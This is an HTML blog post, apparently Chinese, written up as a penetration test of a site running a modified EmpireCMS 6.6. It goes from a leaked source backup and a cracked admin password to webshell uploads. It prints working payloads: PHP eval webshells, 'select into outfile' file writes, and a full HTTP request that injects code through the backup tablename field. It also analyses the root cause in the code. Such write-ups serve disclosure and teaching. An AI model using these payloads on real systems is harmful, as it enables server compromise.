@@ -1,0 +1,380 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>源码泄露到getshell(2) | 6right</title>
+
+<link rel="shortcut icon" href="https://6right.fun/favicon.ico?v=1656423790059">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://6right.fun/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1656423790059"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    源码泄露到getshell(2)
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-01-06 ·
+                    </time>
+                    
+                        <a href="https://6right.fun/tag/u6omW3BTp/" class="post-tags">
+                            # 渗透测试
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="源码泄露到getshell2">源码泄露到getshell(2)</h2>
+<h3 id="前言">前言</h3>
+<p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/10740">源码泄露到getshell(2)</a></p>
+<p>文章所述漏洞已经提交至漏洞平台，且所有恶意操作均已复原</p>
+<h3 id="源码泄露">源码泄露</h3>
+<pre><code>http://www.xxx.com.cn/www.zip
+</code></pre>
+<p>老规矩拿到源码先通关关键词找敏感信息</p>
+<pre><code>key
+pwd
+passwd
+password
+</code></pre>
+<p>找到了半天居然找不到一个有效的密码</p>
+<p>最后在robots.txt中看到CMS的信息-EmpireCMS</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/f9b6c4b0950836b185a9cf23f4377f04.png" alt="image-20211229162324754" loading="lazy"></figure>
+<p>查询知道是开源cms后，直接百度查询数据表结构</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/084ba8972a74ed8411b7d5e402214624.png" alt="image-20211229162411261" loading="lazy"></figure>
+<p>知道了管理员记录表为phome_enewsuser,在源码里全局搜索</p>
+<h4 id="敏感信息泄露">敏感信息泄露</h4>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/dd78c225e4b3fe678c6f39849930e4ce.png" alt="image-20211229162542124" loading="lazy"></figure>
+<p>点击进去得到管理员用户名，密码hash和盐值</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/2713cf2678be1c5f758651ef5ab43a25.png" alt="image-20211229162655046" loading="lazy"></figure>
+<p>直接解md5得到口令</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/82be1502fc228ad4a1f498a357f44637.png" alt="image-20211229160102142" loading="lazy"></figure>
+<pre><code>Kite/kite
+</code></pre>
+<p>得到口令后就是找到后台地址，由于是开源的百度一下就有了，访问后台地址</p>
+<pre><code>http://www.xxx.com.cn/e/admin/
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/e0827afa94243d0b0b0b899e637dd44c.png" alt="image-20211229163115110" loading="lazy"></figure>
+<p>得到具体的版本号为6.6</p>
+<h3 id="历史漏洞">历史漏洞</h3>
+<p>登录到后台后，因为是开源CMS，历史漏洞才是渗透的关键</p>
+<p>直接搜索empireCMS漏洞，开始复现历史漏洞</p>
+<h4 id="1后台-模版-公共模版-js调用登陆模版getshell">1.后台-模版-公共模版-js调用登陆模版getshell</h4>
+<p>还没有开始就已经结束</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/4824cbce340d3457b87da4728dcce106.png" alt="image-20211229184744347" loading="lazy"></figure>
+<pre><code>Table 'hdm1010482_db.phome_enewstempgroup' doesn't exist
+</code></pre>
+<p>好家伙，这是把表都删了吗</p>
+<h4 id="2后台数据表与系统模型-导入数据库模型getshell">2.后台数据表与系统模型-导入数据库模型getshell</h4>
+<p>EmpireCMS 7.5以及之前版本中的e/class/moddofun.php文件的LoadInMod函数存在安全漏洞。攻击者可利用该漏洞上传任意文件。</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/34d23de517d45f43c0957bb76a64d2e1.png" alt="image-20211229184846660" loading="lazy"></figure>
+<p>在本地先新建一个test.php.mod文件，内容为</p>
+<pre><code>&lt;?php file_put_contents(&quot;lyy.php&quot;,&quot;&lt;?php @eval(\$_POST['lyy']); ?&gt;&quot;);?&gt;
+</code></pre>
+<p>填入任意表名然后选择马上导入</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/d84d289b354be005d233d82aeb0ddc53.png" alt="image-20211229185238215" loading="lazy"></figure>
+<p>又是一个表不存在，GG</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/26dc739b2849512548ababc1e64b28ea.png" alt="image-20211229185303862" loading="lazy"></figure>
+<h4 id="3后台备份与恢复数据-执行sql语句getshell">3.后台备份与恢复数据-执行sql语句getshell</h4>
+<p>EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。</p>
+<p>也就是后台提供了一个sql语句执行</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/372d28837b33ab31830947846aad192c.png" alt="image-20211229185629606" loading="lazy"></figure>
+<p>只要服务器mysql配置secure_file_priv 不当，就可以向服务器写入文件</p>
+<p><strong>Payload</strong></p>
+<pre><code>select '&lt;?php @eval($_POST[123])?&gt;' into outfile '绝对路径/e/admin/lyy.php'
+</code></pre>
+<p>因为要向站点写入文件，所以必须知道绝对路径才行。</p>
+<p>因为是无回显执行，也不能通过show mysql变量获取部分路径，所以也pass了</p>
+<pre><code>show variables like '%datadir%';
+</code></pre>
+<h4 id="4后台备份与恢复数据-备份数据getshell">4.后台备份与恢复数据-备份数据getshell</h4>
+<p>empirecms 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/ad359be767ca80dd7281bb4f2733113c.png" alt="image-20211229190305166" loading="lazy"></figure>
+<p>选择任意一个表，开始备份抓包</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/aa6d29a5d3212d7aa2de099a77ea5262.png" alt="image-20211229160307352" loading="lazy"></figure>
+<p>将tablename字段改为payload</p>
+<pre><code>@eval($_POST[123])
+</code></pre>
+<p>请求包</p>
+<pre><code>POST /e/admin/ebak/phome.php HTTP/1.1
+Host: www.xxx.com.cn
+Content-Length: 285
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://www.xxx.com.cn
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://www.xxx.com.cn/e/admin/ebak/ChangeTable.php?mydbname=hdm1010482_db
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: bxubwecmsdodbdata=empirecms; bxubwloginuserid=1; bxubwloginusername=Kite; bxubwloginlevel=1; bxubweloginlic=empirecmslic; bxubwloginadminstyleid=1; bxubwloginrnd=F3JiUXpyeXm6mWPTsdUG; bxubwloginecmsckpass=e816ccfcb01f4ed8ee0ad531de6fa67c; bxubwtruelogintime=1640762619; bxubwlogintime=1640762630
+Connection: close
+
+phome=DoEbak&amp;mydbname=hdm1010482_db&amp;baktype=phpinfo()&amp;filesize=300&amp;bakline=500&amp;autoauf=1&amp;bakstru=1&amp;dbchar=gbk&amp;bakdatatype=1&amp;mypath=hdm1010482_db_20211229152350&amp;insertf=replace&amp;waitbaktime=0&amp;readme=&amp;autofield=&amp;tablename%5B%5D=@eval($_POST[123])&amp;chkall=on&amp;Submit=%BF%AA%CA%BC%B1%B8%B7%DD
+</code></pre>
+<p>回显得到备份文件夹名</p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/img_convert/5ac318716bcec96166072ccd01dde4cd.png" alt="image-20211229160450411" loading="lazy"></figure>
+<pre><code>hdm1010482_db_20211229152350
+</code></pre>
+<p>webshell连接备份文件夹下的config.php</p>
+<pre><code>http://www.xxx.cn/e/admin/ebak/bdata/hdm1010482_db_20211229152350/config.php
+</code></pre>
+<p>成功getshell</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/img_convert/962c3b8258536d5cb684c32fc2a09dc9.png" alt="image-20211229160556660" loading="lazy"></figure>
+<h5 id="原理分析">原理分析</h5>
+<p>因为手里有源码，就跟了一下这个漏洞</p>
+<p><strong>首先定位</strong></p>
+<p>直接全局搜索config.php就找到了</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/img_convert/a117af306061cecbc075c4127f114524.png" alt="image-20211230080741204" loading="lazy"></figure>
+<p>在e/admin/ebak/class/functions.php文件中Ebak_DoEbak存在文件写入操作</p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/img_convert/8e1a74c9ca395750c34e32fd4cb722cc.png" alt="image-20211230081008914" loading="lazy"></figure>
+<pre><code class="language-php">$string=&quot;&lt;?php
+	\$b_table=\&quot;&quot;.$b_table.&quot;\&quot;;
+	&quot;.$d_table.&quot;
+	\$b_baktype=&quot;.$add['baktype'].&quot;;
+	\$b_filesize=&quot;.$add['filesize'].&quot;;
+	\$b_bakline=&quot;.$add['bakline'].&quot;;
+	\$b_autoauf=&quot;.$add['autoauf'].&quot;;
+	\$b_dbname=\&quot;&quot;.$dbname.&quot;\&quot;;
+	\$b_stru=&quot;.$bakstru.&quot;;
+	\$b_strufour=&quot;.$bakstrufour.&quot;;
+	\$b_dbchar=\&quot;&quot;.addslashes($add['dbchar']).&quot;\&quot;;
+	\$b_beover=&quot;.$beover.&quot;;
+	\$b_insertf=\&quot;&quot;.addslashes($insertf).&quot;\&quot;;
+	\$b_autofield=\&quot;,&quot;.addslashes($add['autofield']).&quot;,\&quot;;
+	\$b_bakdatatype=&quot;.$bakdatatype.&quot;;
+	?&gt;&quot;;
+	$cfile=$bakpath.&quot;/&quot;.$add['mypath'].&quot;/config.php&quot;;
+	WriteFiletext_n($cfile,$string);
+</code></pre>
+<p>可以看到直接对$d_table变量进行拼接</p>
+<p>再看看写函数WriteFiletext_n</p>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/img_convert/3a300b154426a7b8b7047d54442371af.png" alt="image-20211230081120171" loading="lazy"></figure>
+<p>也没有对写入内容进行过滤，那么只需要知道如何控制$d_table变量值即可</p>
+<p>crtl+左键跟到上面</p>
+<figure data-type="image" tabindex="19"><img src="https://img-blog.csdnimg.cn/img_convert/d034b3fbd42a4d4109e47dbf87cb6949.png" alt="image-20211230081655134" loading="lazy"></figure>
+<p>而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>u</mi><mi>n</mi><mi>t</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">count是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">是</span></span></span></span>tablename的数量，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">tablename是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">是</span></span></span></span>add中tablename的键值</p>
+<figure data-type="image" tabindex="20"><img src="https://img-blog.csdnimg.cn/img_convert/6f2b4af95ed2bf348255bccbdd89d45c.png" alt="image-20211230081920472" loading="lazy"></figure>
+<p>找到调用Ebak_DoEbak函数的位置，知道<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>d</mi><mi>d</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">add就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span>_POST</p>
+<figure data-type="image" tabindex="21"><img src="https://img-blog.csdnimg.cn/img_convert/bfba6d4919564c7d0b2ed50815f30585.png" alt="image-20211230082026334" loading="lazy"></figure>
+<p>那就很清楚了，他对POST传参的tablename进行了处理产生两个变量</p>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>b</mi><mi>t</mi></msub><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">b_table和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">和</span></span></span></span>d_table，其中$b_table是被双引号包裹无法利用的</p>
+<p>但是$d_table没有双引号被包裹，且没有任意过滤直接写入.php文件，导致命令执行</p>
+<h5 id="为什么不是其他参数">为什么不是其他参数？</h5>
+<p>其他参数大部分是被双引号包裹的</p>
+<p>没有被双引号包裹的参数都被强转int，如果传str会返回0 所以pass</p>
+<figure data-type="image" tabindex="22"><img src="https://img-blog.csdnimg.cn/img_convert/77a2e9cafbf4f8e654794067d21af14c.png" alt="image-20211230082241389" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://img-blog.csdnimg.cn/img_convert/bf313ad15a59a2825e8981b93f1f2949.png" alt="image-20211230092413793" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://img-blog.csdnimg.cn/img_convert/fbe941eeb656d604a112c1b9e061a314.png" alt="image-20211230082406487" loading="lazy"></figure>
+<h4 id="3的后续">3的后续</h4>
+<p>在通过漏洞4获得站点真实路径后我又构造sql语句，尝试向站点直接webshell</p>
+<pre><code>select '&lt;?php phpinfo();?&gt;' into outfile '/data/home/hmu072095/htdocs/e/admin/lyy.php'
+</code></pre>
+<p>虽然爆了一个数据库连接错误，但是语句被成功执行，只是被写入的内容被替换成了空</p>
+<figure data-type="image" tabindex="25"><img src="https://img-blog.csdnimg.cn/img_convert/565dae621adae57292d3fd829b161047.png" alt="image-20211229191006620" loading="lazy"></figure>
+<p>可以成功访问但没有内容</p>
+<figure data-type="image" tabindex="26"><img src="https://img-blog.csdnimg.cn/img_convert/e4c430f711dceddd77db3cde11b34677.png" alt="image-20211229191249494" loading="lazy"></figure>
+<p>可以写入正常字符</p>
+<pre><code>select 'test' into outfile '/data/home/hmu072095/htdocs/e/admin/1.txt'
+</code></pre>
+<figure data-type="image" tabindex="27"><img src="https://img-blog.csdnimg.cn/img_convert/960f6032316ad9c0f27f391d9bd69c6d.png" alt="image-20211229193005973" loading="lazy"></figure>
+<p>初步判断是对php标签做了过滤，尝试其他写法进行绕过</p>
+<pre><code>select '&lt;? phpinfo(); ?&gt;' into outfile '/data/home/hmu072095/htdocs/e/admin/ly.php'
+select '&lt;script language=&quot;php&quot;&gt; phpinfo(); &lt;/script&gt;' into outfile '/data/home/hmu072095/htdocs/e/admin/ly.php'
+select '&lt;?php @eval($_POST[1])?&gt;' into outfile '/data/home/hmu072095/htdocs/e/admin/ly.php'
+</code></pre>
+<p>只有最后的asp风格成功写入</p>
+<figure data-type="image" tabindex="28"><img src="https://img-blog.csdnimg.cn/img_convert/f9e46e8ea58625ade34cfb73d98f632f.png" alt="image-20211229192407448" loading="lazy"></figure>
+<p>尝试访问无法执行 查了一下linux上默认不开PHP短标签配置项，溜了溜了</p>
+<h3 id="后记">后记</h3>
+<p>还是以备份文件泄露为入口，最后成功getshell。因为是开源的CMS，主要进行测试历史漏洞，由于二开的魔改，一次的渗透流程相当于把EmpireCMS的能getshell的历史漏洞基本复现了一遍，还是有一点收获的。</p>
+<h2 id=""></h2>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://6right.fun/post/art1/" class="post-title gt-a-link">
+                    记一次从源码泄露到getshell
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/yuan-ma-xie-lu-dao-getshell2/" class="leancloud_visitors" data-flag-title="源码泄露到getshell(2)">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://6right.fun/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
